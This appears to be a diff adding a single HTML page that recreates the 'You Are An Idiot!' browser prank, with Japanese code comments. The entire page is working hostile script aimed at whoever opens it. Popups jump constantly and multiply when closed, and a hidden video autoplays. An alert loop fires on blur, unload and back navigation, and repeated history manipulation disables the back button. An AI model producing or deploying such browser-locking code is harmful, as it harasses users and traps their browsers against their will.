@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>You are an idiot!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            overflow: hidden;
+            background: #000;
+            font-family: Arial, sans-serif;
+            touch-action: none;
+        }
+        
+        .container {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .popup {
+            position: absolute;
+            background: #fff;
+            border: 3px solid #f00;
+            padding: 10px;
+            border-radius: 5px;
+            box-shadow: 5px 5px 15px rgba(255,0,0,0.5);
+            animation: shake 0.3s infinite;
+            z-index: 9999;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(3px, 3px) rotate(1deg); }
+            50% { transform: translate(-3px, -3px) rotate(-1deg); }
+            75% { transform: translate(-3px, 3px) rotate(1deg); }
+        }
+        
+        .popup img {
+            max-width: 180px;
+            max-height: 180px;
+            width: auto;
+            height: auto;
+            display: block;
+            margin: 0 auto 5px;
+        }
+        
+        .popup h2 {
+            text-align: center;
+            color: #f00;
+            font-size: 18px;
+            margin: 5px 0;
+        }
+        
+        .popup button {
+            width: 100%;
+            padding: 8px;
+            font-size: 14px;
+            background: #f00;
+            color: #fff;
+            border: 2px solid #900;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        video {
+            /* 動画を画面に非表示にする（元のCSSを維持） */
+            position: fixed;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="container"></div>
+    
+    <video id="bgVideo" loop playsinline autoplay muted>
+        <source src="1762658176974.mp4" type="video/mp4">
+    </video>
+    
+    <script>
+        const container = document.getElementById('container');
+        const bgVideo = document.getElementById('bgVideo');
+        const images = [
+            '1000014679.jpg',
+            '1000014678.jpg'
+        ];
+        
+        let popupCount = 0;
+        let isPlaying = false;
+        let alertCount = 0;
+        
+        function showAlertLoop() {
+            alertCount++;
+            alert('You Are An Idiot!');
+            if(alertCount < 999) {
+                setTimeout(showAlertLoop, 10);
+            } else {
+                alertCount = 0;
+                setTimeout(showAlertLoop, 100);
+            }
+        }
+        
+        function createPopup() {
+            const popup = document.createElement('div');
+            popup.className = 'popup';
+            
+            const maxX = window.innerWidth - 220;
+            const maxY = window.innerHeight - 220;
+            popup.style.left = Math.max(0, Math.random() * maxX) + 'px';
+            popup.style.top = Math.max(0, Math.random() * maxY) + 'px';
+            
+            const randomImage = images[Math.floor(Math.random() * images.length)];
+
+            popup.innerHTML = `
+                <img src="${randomImage}" alt="">
+                <h2>You Are An Idiot!</h2>
+                <button>閉じる</button>
+            `;
+            
+            container.appendChild(popup);
+            popupCount++;
+            
+            // 激しく動くように間隔を短縮 (100ms)
+            setInterval(() => {
+                popup.style.left = Math.max(0, Math.random() * maxX) + 'px';
+                popup.style.top = Math.max(0, Math.random() * maxY) + 'px';
+            }, 100);
+            
+            const button = popup.querySelector('button');
+            button.addEventListener('click', function(e) {
+                e.stopPropagation();
+                popup.remove();
+                popupCount--;
+                
+                const newCount = Math.min(8, Math.floor(Math.random() * 5) + 3);
+                for(let i = 0; i < newCount; i++) {
+                    setTimeout(() => createPopup(), i * 50);
+                }
+            });
+        }
+        
+        for(let i = 0; i < 3; i++) {
+            setTimeout(() => createPopup(), i * 200);
+        }
+        
+        // startVideo関数とそのイベントリスナーは autoplay 属性により削除
+        
+        setInterval(() => {
+            if(popupCount < 30) {
+                createPopup();
+            }
+        }, 2000);
+        
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            showAlertLoop();
+            return '';
+        });
+        
+        window.addEventListener('blur', showAlertLoop);
+        window.addEventListener('pagehide', function(e) {
+            e.preventDefault();
+            showAlertLoop();
+        });
+        
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+            showAlertLoop();
+        };
+        
+        setInterval(() => {
+            history.pushState(null, null, location.href);
+        }, 100);
+    </script>
+</body>
+</html>
